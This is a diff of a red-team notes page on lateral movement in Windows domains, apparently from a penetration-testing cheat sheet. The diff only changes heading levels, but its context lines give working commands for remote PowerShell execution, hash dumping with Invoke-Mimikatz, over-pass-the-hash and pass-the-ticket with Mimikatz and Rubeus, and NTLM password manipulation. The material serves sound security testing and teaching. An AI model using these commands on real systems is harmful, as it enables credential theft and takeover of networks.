@@ -2,7 +2,7 @@
 title: Lateral Movement
 ---
 
-# PowerShell Remoting
+## PowerShell Remoting
 
 Once a machine is compromised, we need to jump to others in order to find more valuable targets. For that task we can use `PowerShell Remoting` which is increasingly used in enterprises and enabled by default on Server 2012 onwards. PowerShell Remoting uses WinRM protocol, so you can check `evil-winrm` tool. Admin privileges on the target machineis needed.
 
@@ -10,7 +10,7 @@ Once a machine is compromised, we need to jump to others in order to find more v
 
 You can get a elevated shell (`NT AUTHORITY\SYSTEM`) on the remote server if the credentials of the user administrator are used to authenticate (default setting).
 
-## Using Credentials
+### Using Credentials
 
 We can use other credentials:
 ```
@@ -22,7 +22,7 @@ And use it with the parameter `-Credential`
 
 > **Note**: If password is not declared a prompt will be shown in order to enter manually.
 
-## Creating a Session
+### Creating a Session
 
 There are two types of PowerShell Remoting:
 
@@ -53,7 +53,7 @@ Invoke-Command -ComputerName machine01.corp.local -FilePath .\file.ps1
 
 > **RedTeam Note**: Since admin privs are needed is a useful tool to check if the user has admin privs on the target machine.
 
-## Execute locally loaded funcitons on the remote machine
+### Execute locally loaded funcitons on the remote machine
 
 We can execute locally loaded function on the remote machine.
 
@@ -61,7 +61,7 @@ We can execute locally loaded function on the remote machine.
 Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content .\servers.txt)
 Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ArgumentList "-List hello" -ComputerName (Get-Content .\servers.txt)
 ```
-## Load a script remotely
+### Load a script remotely
 
 we can load a script remotely.
 
@@ -72,7 +72,7 @@ Enter-PSSession -Session $sess
 [machine01.corp.local]: PS C:\> hello
 Hello World!
 ```
-## Execute "Stateful" commands
+### Execute "Stateful" commands
 
 We can execute "Stateful" commands.
 
@@ -81,7 +81,7 @@ $sess = New-PSSession -ComputerName server1
 Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
 Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
 ```
-## Transfering files
+### Transfering files
 
 We can also transfer files with PSRemoting and `Copy-Item`
 ```
@@ -90,7 +90,7 @@ Copy-Item C:\Windows\remote_file.txt C:\Windows\local_file.txt -FromSession $ses
 Copy-Item C:\Windows\local_file.txt C:\Windows\remote_file.txt -ToSession $sess
 ```
 
-# Dump credentials
+## Dump credentials
 
 Once we have administrator privileges on the target machine we can dump credentials with `Invoke-Mimikatz`. See this section:
 
@@ -109,7 +109,7 @@ Or we can execute locally loaded functions.
 Invoke-Command -Session $sess -ScriptBlock {function:Invoke-Mimikatz -DumpCreds}
 ```
 
-# Over-Pass-the-Hash / Pass-The-Key
+## Over-Pass-the-Hash / Pass-The-Key
 
 Abusing kerberos functionality we can execute commands as another user by only knowing the NTLM hash.
 
@@ -135,7 +135,7 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:corp.local 
 .\Rubeus.exe asktgt /domain:dollarcorp.moneycorp.local /user:srvadmin /rc4:a98e18228819e8eec3dfa33cb68b0728 /ptt
 ```
 
-# Pass-The-Ticket
+## Pass-The-Ticket
 
 We can use the tickets that are save to a `.kirbi` file. 
 
@@ -152,7 +152,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
 .\Rubeus.exe ptt /ticket:<base64ticket>
 ```
 
-# Manipulating User Passwords with Mimikatz 
+## Manipulating User Passwords with Mimikatz 
 
 Mimikatz supports the ability to manipulate user password, so we can change the password to a new one and restore it later.
 
@@ -166,7 +166,7 @@ Invoke-Mimikatz -Command '"lsadump::setntlm /server:dc01 /user:jeff /ntlm:<NTLM>
 
 * [https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/](https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/)
 
-# Process Injection
+## Process Injection
 
 We can also inject our shellcode or our binary to a process running by a user. Notice that **elevated privileges are needed**.
 
